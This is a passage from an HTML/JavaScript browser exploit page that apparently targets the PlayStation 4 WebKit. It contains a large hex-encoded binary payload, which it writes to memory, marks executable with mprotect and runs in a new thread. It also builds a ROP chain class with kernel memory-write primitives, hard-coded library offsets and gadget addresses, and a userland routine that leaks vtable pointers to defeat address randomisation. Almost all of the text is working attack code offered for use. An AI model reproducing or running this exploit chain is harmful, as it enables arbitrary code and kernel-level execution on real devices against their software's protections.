c8d,0X000088ba,0X1115ff00,0Xeb000011,0X10408b54,0Xfe183d66,0X73772774,0Xe283c289,0Xfa8166ef,0X0674fe00,0X02f88366,0X8d486175,0Xba18247c,0X00000088,0X29358d48,0Xeb00000b,0X7c8d4811,0X88ba1824,0X48000000,0X0a76358d,0X15ff0000,0X000010c8,0X24448b48,0X008b4810,0X24448948,0X748d4818,0X88ba1824,0X4c000000,0X15ffe789,0X000010a8,0X03bb1aeb,0Xeb000000,0Xffddbb13,0X0cebffff,0Xffffdbbb,0Xbb05ebff,0X0000002d,0Xa0c48148,0X89000000,0X415d5bd8,0X8548c35c,0X158b48ff,0X0000103c,0X74f88948,0X128b4816,0X74d28548,0X423b480b,0X48f27520,0Xc310428b,0Xc3c3c031,0Xfa1e0ff3,0Xe5894855,0X56415741,0X54415541,0Xec834853,0X458b4828,0X7d894800,0X668b4cc0,0X7e8b4c08,0Xf3894858,0X44768b44,0Xf8788b48,0X50468b48,0X486e8b44,0X48ff8548,0X74c84589,0X013f8341,0X894c2b75,0Xe8c931e7,0Xffffff8a,0Xc87d8b48,0Xe8c48949,0Xffffff7e,0X49ff854d,0X3974c089,0Xe8ff894c,0Xffffff6e,0Xebc18948,0X5589482c,0Xfbf5e8b8,0X8b48ffff,0Xc085b855,0X8b48c475,0X8348c07d,0X894828c4,0X5c415bde,0X5e415d41,0Xff5d5f41,0X000f3b25,0Xe4854d00,0Xc04d8948,0X854d6374,0X445e74c0,0X8b48f689,0X000fa305,0Xc6014c00,0X40ff854d,0X4cc7950f,0X0fc87d39,0X8440c295,0X453674d7,0X3174f685,0X4000bf41,0X894c0000,0Xf72945e7,0Xfffa894c,0X4d8b48d0,0Xc98548c0,0X8d431f74,0Xc0002e94,0X8d4bffff,0X8948273c,0X5915ffce,0Xeb00000f,0Xea894408,0Xffe7894c,0X89c031d0,0X83480443,0X315b28c4,0X415c41c0,0X415e415d,0Xf3c35d5f,0Xb9fa1e0f,0Xc0000082,0Xc148320f,0X094820e2,0X058b48c2,0X00000f70,0X8948088b,0Xc82948d0,0X48c1200f,0X8148ca89,0Xfeffffe2,0Xc2220fff,0X48fa5e9c,0X0f4e3d8b,0X8d480000,0Xfffce815,0X05ea83ff,0Xbc8f8b44,0X44000000,0Xc229ca29,0X08548942,0X158d4801,0Xfffffb2c,0Xc0978b44,0X83000000,0X894105ea,0Xd02945d0,0X46c02941,0X01104489,0Xc48f8b44,0X44000000,0Xc229ca29,0X08548942,0X158d4801,0Xfffffc47,0Xc88f8b44,0X83000000,0X294405ea,0X42c229ca,0X01085489,0X39158d48,0X44fffffe,0X00cc8f8b,0Xea830000,0Xca294405,0X8942c229,0X48010854,0Xfbc4158d,0X8b44ffff,0X0000b887,0X05ea8300,0X29c22944,0X548942c2,0X9d560100,0Xc3c1220f,0Xfa1e0ff3,0X75083f83,0X18478b46,0Xe9c1c189,0X893c7518,0X81d2f7c2,0X0c0000e2,0X81307500,0X1337387f,0X27750000,0Xfbffff25,0X0d8d48ff,0X0000091f,0X31184789,0Xc28948c0,0X8adaf748,0X54880a14,0Xff483807,0Xf88348c0,0Xffea7510,0X000d3f25,0X41574100,0X41554156,0X48535554,0X4828ec83,0X8949fd89,0Xd58941f4,0X65cb8948,0X25348b4c,0X00000000,0X247c8d4c,0X0014ba0c,0X894c0000,0Xfff631ff,0X000dc715,0X6c894400,0X8d480c24,0X4c10247c,0X10bae689,0Xff000000,0X000db715,0X358b4800,0X00000d48,0X31f7894c,0Xb515ffd2,0X4800000d,0X894ce989,0Xdf8948fe,0X0020b841,0X14ba0000,0Xff000000,0X000cdb15,0X358b4800,0X00000d1c,0Xfff7894c,0X000d8315,0Xc4834800,0X415d5b28,0X415d415c,0Xc35f415e,0Xfa1e0ff3,0X56415741,0X54415541,0X81485355,0X0001c0ec,0Xfc894900,0X1824848b,0X48000002,0X8b44f589,0X021024b4,0X89490000,0X564150d5,0X1824848b,0X50000002,0X1824b4ff,0Xff000002,0X021824b4,0X15ff0000,0X00000c50,0X30c48348,0X840fc085,0X000002cd,0X89f68545,0Xc4850fc3,0X4c000002,0X2024748d,0X894cf631,0X0010baf7,0X15ff0000,0X00000cec,0X24448d48,0X6c894c30,0Xc7482024,0X00282444,0X4c000001,0X50246c8d,0X8948f631,0Xba082444,0X00000010,0X4cc78948,0X70247c8d,0X0cba15ff,0X894c0000,0Xba30246c,0X00000048,0X2444c748,0X00002038,0X4cf63100,0X15ffff89,0X00000c9c,0Xa5058d48,0X48000009,0X90248489,0X48000000,0X0916058d,0X89480000,0X00982484,0X8d480000,0X00088705,0X84894800,0X0000a024,0X058d4800,0X000007f8,0X24848948,0X000000a8,0X69058d48,0X48000007,0Xb0248489,0X65000000,0X25048b48,0X00000000,0Xe1358b48,0X3100000b,0Xc78948d2,0X24048948,0X0c4a15ff,0X8b480000,0X4c08247c,0X894cf689,0X8115fffa,0X4800000b,0X0bba358b,0X89410000,0X3c8b48c6,0X1d15ff24,0X4500000c,0X850ff685,0X000001c7,0Xc53d8b48,0X3100000b,0X31d231c9,0Xbc8d4cf6,0X0000bc24,0X2915ff00,0X4800000c,0Xb824848d,0X31000000,0X007cbaf6,0X89480000,0X448948c7,0X8d4c1024,0Xff402474,0X000bc715,0X848b4800,0X0001f024,0Xf9894c00,0X000001ba,0Xef894c00,0Xb82484c7,0X37000000,0X48002013,0X00037005,0Xc6894800,0X24448948,0Xfd97e808,0X8b48ffff,0X000b2f35,0X48d23100,0Xff243c8b,0X000b9b15,0Xbaf63100,0X00000010,0Xfff7894c,0X000b7315,0Xfe894c00,0X4dff894c,0Xb841f189,0X00000080,0X4d0d8d48,0Xba000006,0X00000020,0X0aa215ff,0X8b480000,0X000aeb35,0Xc7894100,0X243c8b48,0X0b4e15ff,0X85450000,0Xda850fff,0X48000000,0X3424848d,0X31000001,0X007cbaf6,0X89480000,0X448948c7,0X8d4c1824,0X013824bc,0X15ff0000,0X00000b10,0X24748b48,0Xf9894c08,0Xbaef894c,0X00000002,0X342484c7,0X37000001,0Xe8002013,0Xfffffcf1,0X89358b48,0X3100000a,0X3c8b48d2,0Xf515ff24,0X3100000a,0X0010baf6,0X894c0000,0Xcd15fff7,0X4d00000a,0Xb841f189,0X00000080,0Xad0d8d48,0Xba000005,0X00000020,0X4cfe894c,0X15ffff89,0X000009fc,0X45358b48,0X4100000a,0X8b48c589,0X15ff243c,0X00000aa8,0X75ed8545,0X7c8b4838,0X894c1024,0Xad15ffe6,0X85000009,0X410674c0,0Xeb243c8b,0X7c8b4815,0X89481824,0X9515ffee,0X85000009,0X8b1d74c0,0Xff83007d,0Xff0674ff,0X00097b15,0X3d8b4800,0X00000a1c,0X0a8615ff,0X0feb0000,0X0d3d8b48,0Xff00000a,0X000a7715,0X48db3100,0X01b8c481,0Xd8890000,0X5c415d5b,0X5e415d41,0X31c35f41,0Xff8548c0,0X8b481574,0X0009eb05,0X008b4800,0X74c08548,0X78394806,0Xc3f27520,0Xfa1e0ff3,0X53555441,0X0a3e15ff,0X89410000,0X058b48c4,0X000009b4,0X48288b48,0X840fed85,0X00000082,0X8308458b,0X7174fff8,0X91158b48,0X48000009,0X85481a8b,0X8b6274db,0X73c23913,0X9b8b4809,0X00000090,0Xd039eceb,0X8b480973,0X0000889b,0X83dfeb00,0X7400047b,0X7b816640,0X75133708,0X7b836638,0X3175200a,0X493d8b48,0X48000009,0Xba0c738d,0X00000020,0X099215ff,0X8b480000,0X00092b05,0X53b70f00,0X73b70f08,0X004d8b0a,0Xff388b48,0X00089f15,0X6d8b4800,0Xff75e910,0X445bffff,0X415de089,0X5355c35c,0X18ec8348,0X247c8948,0X8b486508,0X0000252c,0X8b480000,0X0008e335,0X48d23100,0X15ffef89,0X00000950,0X244c8b4c,0X80b84108,0X48000000,0X04260d8d,0X90ba0000,0Xbb000000,0X800f0a25,0X10798d49,0Xfffe8948,0X00085715,0X75c08500,0X48c38902,0X08a2358b,0X89480000,0X0915ffef,0X48000009,0X8918c483,0Xc35d5bd8,0Xfa1e0ff3,0X54415541,0Xfd894855,0X8b485653,0Xdb31087f,0Xfffeaee8,0Xc08548ff,0X8b480474,0X89481058,0Xdd15ffef,0X85000007,0Xc48941c0,0X7d830675,0X49740004,0X74db8548,0X7b836647,0X40750250,0X60ab8d4c,0X4c000002,0X3fe8ef89,0X85ffffff,0Xba2d75c0,0X000000a0,0X48ee894c,0X15ffdf89,0X00000890,0Xa0bb8d48,0Xba000000,0X00000360,0X15fff631,0X00000874,0X4d89c931,0Xe4314504,0Xe089445a,0X5c415d5b,0Xf3c35d41,0X55fa1e0f,0Xfb894853,0X7f8b4851,0Xe8ed3108,0Xfffffe23,0X74c08548,0X688b4804,0Xdf894810,0X075215ff,0Xc0850000,0X7b830675,0X1a740004,0X74ed8548,0X007d8117,0X00000200,0X8d480e75,0Xbbe8247d,0X89fffffe,0Xc0310443,0Xc35d5b5a,0Xfa1e0ff3,0X000082b9,0X48320fc0,0X4820e2c1,0X8b48c209,0X00084f05,0X48088b00,0X2948d089,0Xc1200fc8,0X48ca8948,0Xffffe281,0X220ffffe,0Xfa5e9cc2,0X2d3d8b48,0X48000008,0Xff6d158d,0Xea83ffff,0X8f8b4405,0X000000d8,0X29ca2944,0X548942c2,0X8d480108,0Xfffec315,0X8f8b44ff,0X000000dc,0X4405ea83,0Xc229ca29,0X08548942,0X158d4801,0Xfffff944,0Xd08f8b44,0X83000000,0X294405ea,0X42c229ca,0X01085489,0X71158d48,0X44fffffd,0X00d48f8b,0Xea830000,0Xca294405,0X8942c229,0X48010854,0Xf9fe158d,0X8b44ffff,0X0000e097,0X05ea8300,0X45d08941,0X2941d029,0X448946c0,0X8b440110,0X0000e487,0Xc2294400,0X8942c229,0X56010054,0Xc1220f9d,0X1e0ff3c3,0Xff8166fa,0X00ba0384,0X48000000,0X04ae058d,0X0f480000,0X90c3c245,0X00000000,0X00000000,0X53656353,0X6c6c6568,0X65726f43,0Xebc03100,0Xe9900001,0X4800eb00,0X00c3c031,0Xc0ffc031,0X72660090,0Xeb006565,0X63530003,0X65685365,0X49556c6c,0X65786500,0X61747563,0X00656c62,0X2e707061,0X2e657865,0X78727073,0X62696c00,0X6e72656b,0X735f6c65,0X732e7379,0X00787270,0X52656353,0X746f6d65,0X616c5065,0X1eeb0079,0X6e656800,0X7365725f,0X5f656d75,0X63746170,0X00736568,0X74737973,0X725f6d65,0X6d757365,0X68705f65,0X34657361,0X61642f00,0X732f6174,0X2f666c65,0X0098e900,0X00000000,0X02bae900,0Xb8000000,0X00000001,0X000000c3,0X00000000,0X00000002,0X31000000,0X00000000,0X00000000,0X0000ff00,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X40000000,0X30003000,0X00000000,0X40000000,0X00000000,0X00800000,0Xffff4000,0Xf0000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000001,0X31000000,0X00000000,0X20000380,0X0000ff00,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X40000000,0X40004000,0X00000000,0X40000000,0X00000002,0X00800000,0Xffff4000,0Xf0000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X454b4146,0X454b4146,0X454b4146,0X454b4146,0X8d26c296,0X8b1c2669,0Xff6b3b1e,0X124ee02f,0X7eb873f5,0X877c985c,0Xaedaf167,0Xab4bf9a0,0X64ced877,0Xa64fc16a,0Xccaab99b,0X3fa40976,0X62f5fab9,0X49b80a84,0Xc49edf02,0X56d3371a,0X156ea40d,0X8da01507,0X20929d97,0Xb2c35243,0Xf3d3f7fd,0X4f28a269,0X40806f62,0X1e803b5f,0X8b0d385e,0X5856a856,0Xea6fd9d8,0X16402a12,0X273dedc1,0X9763a016,0Xcc553961,0X08fa058a,0X5655fd28,0X05659431,0X6c57d3e7,0X0b671c0d,0X3867354d,0X3b3e90bc,0Xf2bc6caa,0Xd2459eeb,0X3aca2f09,0Xad36029c,0Xb2b1c12e,0X6b1f7c6d,0X20628fa1,0X366cd68c,0X9e545ad6,0X25a8a930,0X3e12943d,0Xf01b160d,0Xe0724286,0X68399cd6,0X968011db,0X41712b18,0X17e87848,0X1f007d8b,0X75d26816,0Xf2e0b597,0Xac750c6d,0Xb1d5d916,0Xd0e88bb5,0X611fa7bf,0X68f8085b,0Xbcd1f0e7,0X55bf6039,0X30207c9c,0X442850e8,0X2a51ce02,0Xfddb5425,0X9a974586,0Xe3f0171e,0X120f92a5,0Xa64c5c2a,0Xe87fcfa5,0X1a65f35b,0Xb99bcfc8,0X5d90c92a,0Xf6cf08d4,0Xfc5a5a03,0X11dbb69e,0X623de2ed,0X5d88fcc1,0X2d31ac97,0X70ad15c3,0X5aa0be05,0X449c34e6,0Xfee52b78,0X68d45638,0Xe6a41383,0Xab9cd2fa,0X105f89ac,0X046f758f,0Xbcb9aebc,0Xfa421db7,0Xb41f944e,0X6b9c270a,0Xebd2c7ab,0X29524227,0X4025c841,0X6d48e054,0X84778023,0X249b6f4d,0X6b2afe51,0X9ea18028,0Xca186dbd,0X799e7d8d,0Xebb8e05a,0Xd9f33dd1,0Xa72a9002,0Xa29a7eb5,0Xa8212fd7,0Xa18c7d50,0X97bf2f91,0Xc1c292be,0X1f0c8c0d,0X153531de,0X97cc9039,0X097f2e47,0Xce9cc3e9,0X58c8b291,0X1d70e876,0Xe64a5f72,0X942236aa,0Xb39052c6,0Xeff09b9f,0Xc3538e57,0Xd7c930e3,0X790c3ab0,0Xd4a8971b,0Xb0d22281,0X007d6282,0Xc79e4758,0X65b4e82d,0X6a7805be,0X5ac93189,0Xc150de44,0X3e9dfdc7,0X40174221,0X41c9f979,0X0fd7fcc1,0Xe2a37634,0X205a1bc0,0X522faf0f,0X723483cd,0X3312b3af,0Xb0202c21,0Xb12da0c6,0Xb0a7e359,0X5b4c1c4e,0X509a105f,0X7986cc18,0X0210ff25,0Xa903908f,0X1cf2ba37,0X4509cc13,0X7455b815,0X0424280a,0Xb3ab19d1,0Xf8b644ca,0X722ab13d,0X86e43588,0X0847556b,0X69ab1625,0Xfef6bf1d,0X000001c0,0X015621e0,0X01579df8,0X01b946e0,0X02646ca8,0X0264db40,0X02648238,0X02648248,0X0264c000,0X0264c808,0X026541c0,0X01100310,0X00271e20,0X0043e610,0X0043e7d0,0X00301b20,0X00301ce0,0X00487ab0,0X002196d0,0X00219790,0X002714b0,0X001496c0,0X0030f450,0X000f8370,0X0008bcd0,0X00630c40,0X006439a0,0X006441e0,0X0063fee0,0X00643a00,0X004628b0,0X00445060,0X001ff2d0,0X001ff500,0X0061ced0,0X006252d0,0X00624970,0X0061f690,0X0061f9d0,0X0061f260,0X0007b9e0,0X0007b810,0X0007bb80,0X0007bbd0,0X0007c1c0,0X0041eb00,0X0064473c,0X0064488e,0X00645026,0X00645d09,0X0064232d,0X00642f68,0X00624a15,0X0062084d,0X0064e070,0X0064ee3e,0X006c3ef9,0X006c412a,0X0001d1c0,0X0001d520,0X00188c10,0X00ee55c1,0X0010039b,0X001003b6,0X0016eaa4,0X008621d4,0X008afbc2,0X00a27bd4,0X0016ead2,0X00249f7b,0X00862202,0X00a27c02,0X00138da0,0X00138e90,0X003c5ea7,0X003c8540,0X0032079b,0X00db0b60,0X003d7aff,0X00fd3211,0X00a10a81,0X006180fd,0X00743299,0X000d1866,0X00000454,0X00000474,0X00000000,0X00000000,0X6c6d7863,0X702f2f3a,0X746f6e73,0X63696669,0X6f697461,0X65742f6e,0X63695f78,0X735f6e6f,0X65747379,0X0000006d,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6c6d7863,0X702f2f3a,0X746f6e73,0X63696669,0X6f697461,0X65742f6e,0X63695f78,0X735f6e6f,0X65747379,0X0000006d,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6c6d7863,0X702f2f3a,0X746f6e73,0X63696669,0X6f697461,0X65742f6e,0X63695f78,0X735f6e6f,0X65747379,0X0000006d,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000001,0X00000001,0X00000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6ffffef5,0X00000000,0X00002e48,0X00000000,0X00000005,0X00000000,0X00002e40,0X00000000,0X00000006,0X00000000,0X00002e28,0X00000000,0X0000000a,0X00000000,0X00000001,0X00000000,0X0000000b,0X00000000,0X00000018,0X00000000,0X00000015,0X00000000,0X00000000,0X00000000,0X0000001e,0X00000000,0X00000008,0X00000000,0X6ffffffb,0X00000000,0X08000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000];
	var bufLen = payload.length * 4
	var payload_loader = p.malloc32(bufLen);
	var loader_writer = payload_loader.backing;
	for(var i=0; i < payload.length; i++)
	{
		loader_writer[i] = payload[i];
	}
	chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
	var pthread = p.malloc(0x10);
	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
	showMessage("Payload Loaded.");
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
</script>
<script>
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
</script>
<script>
const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};
</script>
<script>
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    //RW -> ROP method is strongly based off of:
    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

